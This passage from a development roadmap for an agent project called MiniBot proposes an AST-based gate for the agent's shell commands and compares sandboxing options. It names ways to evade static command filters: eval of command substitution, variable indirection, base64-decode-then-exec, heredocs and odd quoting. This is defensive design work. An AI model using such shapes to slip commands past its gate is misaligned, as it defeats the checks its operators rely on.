Parse the proposed command into a real shell AST before running it — not
regex on raw text, which has known blind spots (heredocs, substitutions, and
malformed quoting can bypass a regex-based fragment splitter). Candidates,
not decided: `bashlex` (pure Python, no native extension) or `tree-sitter` +
`tree-sitter-bash` (heavier, more complete grammar). Walking the AST gives
deterministic structural signals — command names, redirect targets,
`eval`/`source`/process-substitution/decode-and-exec shapes — which is
protocol/format parsing, not semantic classification, so it fits the
project's existing rule against text-matching for intent.

Deliberately **not** a small ML classifier (a "mini BERT" or similar) for
this: a security gate needs to be auditable ("blocked: calls `eval` with a
command substitution", not "scored 0.73"), and this is an adversarial
setting — a learned classifier is exactly the weakest thing to put in front
of a malicious/injected command, whereas an AST node either is an `eval`
call or it isn't.

Ceiling: static analysis of arbitrary shell is fundamentally incomplete —
dynamic reconstruction (`eval "$(echo ...)"`, `${!VAR}` indirection,
base64-decode-then-exec) can slip past any static analyzer, parser-based or
ML-based. This is a fast pre-filter for the common dangerous shapes, run in
front of whatever containment option below is chosen — not a substitute for
one.

Options for an owner who wants MiniBot to add its own containment layer on
top of deployment-level isolation (not decided, not a committed
deliverable — see Trust model):

1. Port `python_exec`'s existing `sandbox_mode`/jail-wrapper pattern onto
   `BashToolConfig` — smallest diff, reuses infrastructure already in the
   codebase, relies on an external jail tool (bubblewrap/firejail/nsjail)
   the owner installs. Note: `python_exec`'s own jail mode ships with an
   empty `command_prefix` today (`config.example.toml:434-436`, comment
   mentions Firejail but no working example) — porting this to `bash`
   should ship a real example for both, not just plumbing.
2. A custom Rust supervisor binary wrapping the shell exec, giving tighter
   control (seccomp filters, mount namespaces, capability dropping) than a
   generic jail wrapper — but net-new development, plus a build/distribution
   burden (a compiled binary per platform) for a self-hosted, pip/poetry-
   installed project.
3. Containerize tool execution itself (run `bash`/`python_exec` inside a
   throwaway container per call) — strongest isolation, biggest change to
   the deployment model (today MiniBot assumes a plain host process).

(The env-inheritance half of this is already fixed in Phase 0 — what's left
here is the harder, undecided part: filesystem/process isolation.)

## [x] Phase 7 — Share tool construction with task workers

`_build_worker_tools` (`minibot/app/tasks/worker.py`) keeps a narrower tool set
than the main agent and loads only the scheduler bundled extension (#110) plus user-configured
extensions. Shared calculator and skill loader constructors live in
`minibot/app/tool_constructors.py`; each caller retains its own enablement and visibility rules.
Opting more bundled extensions in is Phase 8.

## [ ] Phase 8 — Generic opt-in extensions for task workers

Workers load no bundled extension except the scheduler (`_bundled_modules` in
`minibot/app/extensions.py`), so a specialist agent that lists `rag_*` (or kv memory, MCP tools) in
`tools_allow` gets nothing: those extensions return early for `entrypoint == "worker"`
(`minibot/extensions/integrations/rag.py:34`, `tools/memory.py:23`, `integrations/mcp.py:12`). Found
when a model-authored `rag_manager` agent answered that it had no RAG tools.

The scheduler precedent (#110) shows that registering the tools is the small part. The daemon-side
`start()` work does not run in a worker, so each extension needs lazy initialization and a lock
against concurrent workers (`SQLAlchemyScheduledPromptStore._session`), plus isolation tests.

Idea: one config mechanism instead of a per-extension flag, e.g. `[tasks.worker] extensions = [...]`
naming the bundled extensions a worker loads on top of the scheduler. Default empty, so nothing changes
for existing deployments.

- Each extension that can be listed must be safe to register without its service: lazy init, no
  schema race (SQLite) and no per-worker heavy state at import time. RAG models already load lazily and die
  with the worker subprocess, but every task that uses RAG pays the load.
- Document the option in `docs/config.rst`, and update `docs/extensions.rst` and `docs/tasks.rst`, which
  say workers only get configured extension tools.
- Decide against it for RAG if it ships as an MCP server: a long-lived MCP process shares the embedding
  model across tasks, which this mechanism cannot.

Deliberately not done yet (YAGNI): only RAG has asked for it so far, and the RAG-as-MCP plan may remove
the need.

## Explicitly deferred

- MCP OAuth HTTP callback endpoint (issue #65 alternative 2).
- MCP OAuth device flow (issue #65 alternative 3).
- A native SMTP tool: sending mail goes through an MCP server, gated by `[tools.approval]`.

Add either only if a remote MCP server actually in use requires it.
